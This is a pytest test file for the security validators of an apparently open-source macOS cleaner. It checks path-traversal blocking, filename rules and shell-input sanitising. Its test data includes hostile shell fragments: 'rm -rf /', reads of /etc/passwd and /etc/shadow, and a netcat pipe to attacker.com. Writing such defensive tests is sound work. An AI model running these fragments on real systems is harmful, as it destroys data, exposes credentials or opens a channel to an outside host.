#!/usr/bin/env python3
"""
Tests for security functions.

Copyright (c) 2026 macOS Cleaner contributors
Licensed under the MIT License
"""

import os
import pytest
from pathlib import Path

from mac_cleaner.security import validate_finder_path, SecurityValidator


def test_validate_finder_path_rejects_missing_path(tmp_path):
    allowed = [str(tmp_path)]
    ok, message, safe_path = validate_finder_path("", allowed)
    assert ok is False
    assert message
    assert safe_path == ""


def test_validate_finder_path_allows_within_root(tmp_path):
    file_path = tmp_path / "example.txt"
    file_path.write_text("ok")
    ok, message, safe_path = validate_finder_path(str(file_path), [str(tmp_path)])
    assert ok is True
    assert message == ""
    assert safe_path == str(file_path.resolve())


def test_validate_finder_path_blocks_outside_root(tmp_path):
    outside = Path(os.sep) / "tmp"
    outside.mkdir(exist_ok=True)
    ok, message, safe_path = validate_finder_path(str(outside), [str(tmp_path)])
    assert ok is False
    assert "allowed" in message.lower()
    assert safe_path == ""


class TestSecurityValidator:
    """Test the SecurityValidator class"""

    def test_validate_path_accepts_valid_paths(self, tmp_path):
        """Test that valid paths are accepted"""
        test_file = tmp_path / "test.txt"
        test_file.write_text("test")

        is_valid, error = SecurityValidator.validate_path(
            str(test_file), [str(tmp_path)]
        )
        assert is_valid is True
        assert error == ""

    def test_validate_path_blocks_protected_system_paths(self):
        """Test that protected system paths are blocked"""
        protected_paths = ["/System/Library", "/usr/bin", "/etc/passwd", "/var/root"]

        for path in protected_paths:
            is_valid, error = SecurityValidator.validate_path(path, ["/Users"])
            assert is_valid is False
            assert "Access denied" in error
            assert "protected" in error

    def test_validate_path_blocks_protected_user_paths(self):
        """Test that protected user paths are blocked"""
        protected_paths = ["~/Documents", "~/Desktop", "~/.ssh", "~/Library/Keychains"]

        for path in protected_paths:
            is_valid, error = SecurityValidator.validate_path(path, ["/Users"])
            assert is_valid is False
            assert "Access denied" in error
            assert "protected" in error

    def test_validate_path_blocks_path_traversal(self, tmp_path):
        """Test that path traversal attacks are blocked"""
        malicious_paths = [
            "../../../etc/passwd",
            "/tmp/../../../etc/shadow",
            f"{tmp_path}/../../../System",
        ]

        for path in malicious_paths:
            is_valid, error = SecurityValidator.validate_path(path, [str(tmp_path)])
            assert is_valid is False

    def test_validate_path_rejects_invalid_inputs(self):
        """Test that invalid inputs are rejected"""
        invalid_inputs = ["", None, 123, [], {}]

        for invalid_input in invalid_inputs:
            is_valid, error = SecurityValidator.validate_path(invalid_input, ["/Users"])
            assert is_valid is False
            assert "Invalid path" in error

    def test_sanitize_shell_input_removes_dangerous_chars(self):
        """Test that dangerous shell characters are removed"""
        dangerous_inputs = [
            "'; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(id)",
            ">> /etc/passwd",
        ]

        for dangerous_input in dangerous_inputs:
            sanitized = SecurityValidator.sanitize_shell_input(dangerous_input)
            # Should be safe (either quoted or cleaned)
            assert sanitized is not None
            assert isinstance(sanitized, str)
            # Should not contain dangerous command separators
            assert "&&" not in sanitized
            assert "||" not in sanitized
            assert ">>" not in sanitized
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "`" not in sanitized
            assert "$(" not in sanitized

    def test_validate_filename_accepts_valid_names(self):
        """Test that valid filenames are accepted"""
        valid_filenames = [
            "document.txt",
            "file_with_underscores.doc",
            "file-with-dashes.pdf",
            "123456",
            "a" * 255,  # Maximum length
        ]

        for filename in valid_filenames:
            is_valid, error = SecurityValidator.validate_filename(filename)
            assert is_valid is True
            assert error == ""

    def test_validate_filename_rejects_invalid_names(self):
        """Test that invalid filenames are rejected"""
        invalid_filenames = [
            "",  # Empty
            "../etc/passwd",  # Path traversal
            "file/with/slashes",  # Contains slash
            "file\\with\\backslashes",  # Contains backslash
            "file:with:colons",  # Contains colon
            "file*with*wildcards",  # Contains wildcard
            "file?with?question",  # Contains question mark
            'file"with"quotes',  # Contains quotes
            "file<with>brackets",  # Contains brackets
            "file|with|pipe",  # Contains pipe
            "a" * 256,  # Too long
            "file\0with\0null",  # Contains null
            "file\nwith\nnewlines",  # Contains newline
            "file\twith\ttabs",  # Contains tab
        ]

        for filename in invalid_filenames:
            is_valid, error = SecurityValidator.validate_filename(filename)
            assert is_valid is False
            assert error

    def test_validate_filename_rejects_invalid_types(self):
        """Test that invalid types are rejected"""
        invalid_types = [None, 123, [], {}, Path("/tmp")]

        for invalid_type in invalid_types:
            is_valid, error = SecurityValidator.validate_filename(invalid_type)
            assert is_valid is False
            assert "must be a non-empty string" in error

    def test_calculate_secure_checksum(self, tmp_path):
        """Test checksum calculation"""
        test_file = tmp_path / "test.txt"
        test_content = "Hello, World!"
        test_file.write_text(test_content)

        checksum = SecurityValidator.calculate_secure_checksum(str(test_file))
        assert checksum
        assert len(checksum) == 64  # SHA-256 hex length
        assert isinstance(checksum, str)

        # Test with non-existent file
        assert SecurityValidator.calculate_secure_checksum("/non/existent/file") == ""

    def test_is_safe_file_size(self, tmp_path):
        """Test file size validation"""
        # Create a small test file
        test_file = tmp_path / "small.txt"
        test_file.write_text("x" * 100)  # 100 bytes

        # Should be safe with default limit
        is_safe, error = SecurityValidator.is_safe_file_size(str(test_file))
        assert is_safe is True
        assert error == ""

        # Should be safe with custom limit
        is_safe, error = SecurityValidator.is_safe_file_size(
            str(test_file), max_size_mb=1
        )
        assert is_safe is True
        assert error == ""

        # Test with non-existent file
        is_safe, error = SecurityValidator.is_safe_file_size("/non/existent/file")
        assert is_safe is False
        assert "Cannot access file" in error
